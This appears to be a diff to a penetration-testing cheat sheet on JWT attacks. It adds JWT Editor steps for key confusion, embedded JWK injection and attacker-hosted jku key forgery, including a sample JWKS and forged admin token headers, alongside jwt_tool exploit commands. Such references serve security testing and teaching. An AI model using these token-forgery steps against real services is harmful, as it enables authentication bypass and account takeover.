@@ -12,7 +12,7 @@
 - [JWT Signature](#jwt-signature)
     - [JWT Signature - Null Signature Attack (CVE-2020-28042)](#jwt-signature---null-signature-attack-cve-2020-28042)
     - [JWT Signature - Disclosure of a correct signature (CVE-2019-7644)](#jwt-signature---disclosure-of-a-correct-signature-cve-2019-7644)
-    - [JWT Signature - None algorithm (CVE-2015-9235)](#jwt-signature---none-algorithm-cve-2015-9235)
+    - [JWT Signature - None Algorithm (CVE-2015-9235)](#jwt-signature---none-algorithm-cve-2015-9235)
     - [JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)](#jwt-signature---key-confusion-attack-rs256-to-hs256-cve-2016-5431)
     - [JWT Signature - Key Injection Attack (CVE-2018-0114)](#jwt-signature---key-injection-attack-cve-2018-0114)
 - [JWT Secret](#jwt-secret)
@@ -152,7 +152,7 @@ Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh
 ```
 
 
-### JWT Signature - None algorithm (CVE-2015-9235)
+### JWT Signature - None Algorithm (CVE-2015-9235)
 
 JWT supports a `None` algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.
 
@@ -207,6 +207,17 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
     ```ps1
     python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
     ```
+* Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
+    1. Find the public key, usually in `/jwks.json` or `/.well-known/jwks.json`
+    2. Load it in the JWT Editor Keys tab, click `New RSA Key`.
+    3. . In the dialog, paste the JWK that you obtained earlier: `{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}`
+    4. Select the PEM radio button and copy the resulting PEM key.
+    5. Go to the Decoder tab and Base64-encode the PEM.
+    6. Go back to the JWT Editor Keys tab and generate a `New Symmetric Key` in JWK format.
+    7. Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied.
+    8. Edit the JWT token alg to `HS256` and the data.
+    9. Click `Sign` and keep the option: `Don't modify header`
+
 * Manually using the following steps to edit an RS256 JWT token into an HS256
     1. Convert our public key (key.pem) into HEX with this command.
 
@@ -243,9 +254,14 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 
 
 **Exploit**:
-```ps1
-python3 jwt_tool.py [JWT_HERE] -X i
-```
+* Using [ticarpi/jwt_tool]
+    ```ps1
+    python3 jwt_tool.py [JWT_HERE] -X i
+    ```
+* Using [portswigger/JWT Editor](#)
+    1. Add a `New RSA key`
+    2. In the JWT's Repeater tab, edit data
+    3. `Attack` > `Embedded JWK`
 
 **Deconstructed**:
 ```json
@@ -432,17 +448,38 @@ It is sometimes exposed publicly via a standard endpoint:
 * `/api/keys`
 * `/api/v1/keys`
 
+You should create your own key pair for this attack and host it. It should look like that:
+
+```json
+{
+    "keys": [
+        {
+            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
+            "kty": "RSA",
+            "e": "AQAB",
+            "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
+        }
+    ]
+}
+```
+
 **Exploit**:
 
-```ps1
-python3 jwt_tool.py JWT_HERE -X s
-python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
-```
+* Using [ticarpi/jwt_tool]
+    ```ps1
+    python3 jwt_tool.py JWT_HERE -X s
+    python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
+    ```
+* Using [portswigger/JWT Editor](#)
+    1. Generate a new RSA key and host it
+    2. Edit JWT's data
+    3. Replace the `kid` header with the one from your JWKS
+    4. Add a `jku` header and sign the JWT (`Don't modify header` option should be checked)
 
 **Deconstructed**:
 
 ```json
-{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json"}.
+{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
 {"login":"admin"}.
 [Signed with new Private key; Public key exported]
 ```
